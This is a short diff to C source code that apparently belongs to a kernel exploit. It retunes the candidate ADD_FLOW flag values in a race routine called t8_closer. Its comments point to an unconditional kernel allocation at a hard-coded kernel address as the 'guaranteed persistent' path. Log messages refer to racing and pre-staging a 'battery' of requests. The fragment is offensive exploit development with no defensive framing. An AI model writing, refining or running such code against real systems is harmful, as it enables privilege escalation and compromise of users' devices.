@@ -239,8 +239,10 @@ static void *t8_closer(void *arg) {
         goto hold;
     }
 
-    /* the shape matrix (3 flows — find the working flags) */
-    static const uint16_t fl_cand[3] = {0x40, 0x00, 0x41};
+    /* the shape matrix (the recipe decode: 0x0000 = the guaranteed
+       persistent-flow path — the unconditional kalloc at 0xfffffff00a0b6394;
+       the window [0x23,0xf0] — 0x24 = the exact fixed header) */
+    static const uint16_t fl_cand[3] = {0x00, 0x04, 0x40};
     int best = -1;
     for (int k = 0; k < 3; k++) {
         uint8_t sa[16];
@@ -253,7 +255,8 @@ static void *t8_closer(void *arg) {
         t8_log("STEP2 no working ADD_FLOW shape — decode-owed. HOLD (nothing raced).");
         goto hold;
     }
-    t8_log("STEP2 working shape flags=0x%02x", best);
+    t8_log("STEP2 working shape flags=0x%02x %s", best,
+           best == 0x00 ? "(the GUARANTEED persistent path)" : "(check the recipe file)");
 
     /* pre-stage the battery */
     t8_req_n = 0;
